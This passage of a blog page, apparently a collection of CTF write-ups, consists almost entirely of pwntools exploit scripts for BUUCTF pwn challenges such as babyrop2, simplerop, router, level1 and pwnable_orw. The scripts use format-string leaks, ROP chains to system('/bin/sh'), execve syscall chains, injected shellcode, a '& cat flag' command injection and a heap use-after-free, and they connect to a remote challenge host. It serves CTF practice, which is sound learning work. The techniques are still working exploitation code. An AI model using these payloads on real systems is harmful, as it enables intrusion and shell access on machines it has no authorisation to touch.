ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span>(<span class="params">idx,<span class="built_in">type</span>,value,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Type &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Length &gt; &quot;</span>)</span><br><span class="line">            p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">            p.recvuntil(<span class="string">&quot;Value &gt; &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> length == <span class="number">8</span>:</span><br><span class="line">                p.send(value)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;CNote &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index &gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>,<span class="number">0x88</span>)</span><br><span class="line">newnote(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">newnote(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x41</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">newnote(<span class="number">3</span>,<span class="number">2</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]),<span class="number">0xc</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-55-bjdctf-2020-babyrop2-solve"><a href="#NO-55-bjdctf-2020-babyrop2-solve" class="headerlink" title="NO.55 bjdctf_2020_babyrop2_solve"></a>NO.55 bjdctf_2020_babyrop2_solve</h1><h3 id="exp-55"><a href="#exp-55" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28559</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x004003EF</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400993</span></span><br><span class="line">vuln = <span class="number">0x000400887</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%7$p&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">carry = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x9</span>+<span class="number">1</span>)+p64(carry)+<span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">offset = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = offset + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x9</span>+<span class="number">1</span>)+p64(carry)+<span class="string">&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)+p64(sh_addr)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-56-cmcc-simplerop-solve"><a href="#NO-56-cmcc-simplerop-solve" class="headerlink" title="NO.56 cmcc_simplerop_solve"></a>NO.56 cmcc_simplerop_solve</h1><h3 id="exp-56"><a href="#exp-56" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./cmcc_simplerop&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28194</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;cmcc_simplerop&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">bss_addr = <span class="number">0x080EC2C0</span></span><br><span class="line">int80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">pop_eax = <span class="number">0x080bae06</span></span><br><span class="line">read_addr= <span class="number">0x0806CD50</span> </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>)+p32(read_addr)+p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(pop_eax)+p32(<span class="number">11</span>)+p32(int80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your input :&#x27;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-57-bjdctf-2020-router-solve"><a href="#NO-57-bjdctf-2020-router-solve" class="headerlink" title="NO.57 bjdctf_2020_router_solve"></a>NO.57 bjdctf_2020_router_solve</h1><h3 id="exp-57"><a href="#exp-57" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_router&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27872</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;&amp; cat flag&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input u choose:\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the ip address:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-58-PicoCTF-2018-buffer-overflow-1-solve"><a href="#NO-58-PicoCTF-2018-buffer-overflow-1-solve" class="headerlink" title="NO.58 PicoCTF_2018_buffer_overflow_1_solve"></a>NO.58 PicoCTF_2018_buffer_overflow_1_solve</h1><h3 id="exp-58"><a href="#exp-58" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29582</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;PicoCTF_2018_buffer_overflow_1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x080485CB</span></span><br><span class="line">sla(<span class="string">&#x27;string: \n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-59-jarvisoj-level1-solve"><a href="#NO-59-jarvisoj-level1-solve" class="headerlink" title="NO.59 jarvisoj_level1_solve"></a>NO.59 jarvisoj_level1_solve</h1><h3 id="exp-59"><a href="#exp-59" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level1&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29143</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;jarvisoj_level1&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804A028</span></span><br><span class="line">vuln = <span class="number">0x0804847B</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;本地</span></span><br><span class="line"><span class="string">buf = rl()[-12:-2]</span></span><br><span class="line"><span class="string">#print buf</span></span><br><span class="line"><span class="string">payload = shellcode.ljust(0x88+4,&#x27;\x00&#x27;)+p32(int(buf,16))</span></span><br><span class="line"><span class="string">#gdb.attach(p)</span></span><br><span class="line"><span class="string">sl(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x88</span>+<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(vuln)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">se(payload)</span><br><span class="line">read = l32()</span><br><span class="line"><span class="comment">#print hex(read)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">offset = read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>)+offset</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(vuln)+p32(binsh)</span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-60-pwnable-orw-solve"><a href="#NO-60-pwnable-orw-solve" class="headerlink" title="NO.60 pwnable_orw_solve"></a>NO.60 pwnable_orw_solve</h1><h3 id="exp-60"><a href="#exp-60" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwnable_orw&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29270</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;pwnable_orw&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x0</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">add esp,8</span></span><br><span class="line"><span class="string">mov ebx,0x3</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,42</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,42</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Give my your shellcode:&#x27;</span>,asm(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-61-V-amp-N2020公开赛-easyTHeap-solve"><a href="#NO-61-V-amp-N2020公开赛-easyTHeap-solve" class="headerlink" title="NO.61 [V&amp;N2020公开赛]easyTHeap_solve"></a>NO.61 [V&amp;N2020公开赛]easyTHeap_solve</h1><h3 id="exp-61"><a href="#exp-61" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 